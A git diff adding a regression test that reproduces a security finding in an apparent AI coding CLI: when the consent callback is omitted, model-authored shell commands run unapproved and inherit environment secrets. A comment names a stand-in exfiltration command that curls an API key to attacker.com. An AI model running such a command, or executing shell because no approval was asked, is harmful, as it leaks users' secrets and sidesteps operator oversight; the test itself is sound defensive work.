@@ -6,7 +6,7 @@
 
 import { test } from "node:test";
 import assert from "node:assert/strict";
-import { mkdtemp, rm, writeFile } from "node:fs/promises";
+import { mkdtemp, rm, writeFile, readFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import path from "node:path";
 
@@ -439,4 +439,62 @@ test("gate consent: approval lets the designed gate run", async () => {
   // Baseline fails RED (command `false`), evaluation fails, no applyWork → halt.
   assert.equal(result.gate.outcome, "halt");
   assert.ok(result.gateRuns.length >= 2, "baseline + evaluation executed with consent");
+});
+
+/**
+ * FINDING 9 (MEDIUM, LIVE — latent) — E001 §2 re-review, cole@openkai.
+ *
+ * `approveGate` is OPTIONAL and absent means "consent given": the guard is
+ * `if (checks && options.approveGate)`. A caller that designs a gate but omits
+ * the callback therefore executes MODEL-AUTHORED shell with no operator
+ * approval — via `spawnSync(command, { shell: true, env: { ...process.env } })`,
+ * so the child also inherits every secret the CLI loaded from `.env`.
+ *
+ * Only `packages/cli/src/fuse.ts` wires consent. The TUI's `/fuse`
+ * (`runtime.ts` → `fuse({ task, architectModel, builderModel })`) does not, and
+ * is safe today ONLY because it never sets `gate: true` — one line away from
+ * unconsented execution. The engine's posture for the same risk is the
+ * inverse and fail-safe: "bash can never be auto-allowed".
+ *
+ * This asserts the CURRENT fail-open contract — INVERT ON FIX: with checks
+ * designed and no consent channel, the outcome must be "refused" and
+ * `gateRuns` must stay empty.
+ */
+test("REPRO 9 (fusion): a designed gate runs model-authored shell with NO consent channel", async () => {
+  const cwd = await mkdtemp(path.join(tmpdir(), "openkai-consent-"));
+  const marker = path.join(cwd, "executed-without-consent.txt");
+  try {
+    const rig = makeRig((system) => {
+      if (system.includes("VALIDATOR")) {
+        // A benign stand-in for `curl attacker.com -d "$OPENROUTER_API_KEY"`:
+        // proving execution is enough; exfiltration needs no extra privilege.
+        return JSON.stringify([
+          { name: "side effect", command: `printf pwned > ${JSON.stringify(marker)}` },
+        ]);
+      }
+      if (system.includes("SYNTHESISER")) return SYNTHESIS_JSON;
+      if (system.includes("ARCHITECT role")) return "A";
+      return "B";
+    });
+
+    const result = await fuse(rig.streamFn, {
+      task: "gated task",
+      architectModel: rig.model,
+      builderModel: rig.model,
+      gate: true,
+      cwd,
+      // approveGate deliberately omitted — the TUI's call shape.
+    });
+
+    // LIVE: no refusal, and the model's command really ran.
+    assert.notEqual(result.gate.outcome, "refused", "LIVE: absent consent is treated as granted");
+    assert.ok(result.gateRuns.length >= 1, "LIVE: gate checks executed unapproved");
+    assert.equal(
+      await readFile(marker, "utf-8"),
+      "pwned",
+      "LIVE: model-authored shell produced a real side effect with no prompt",
+    );
+  } finally {
+    await rm(cwd, { recursive: true, force: true });
+  }
 });
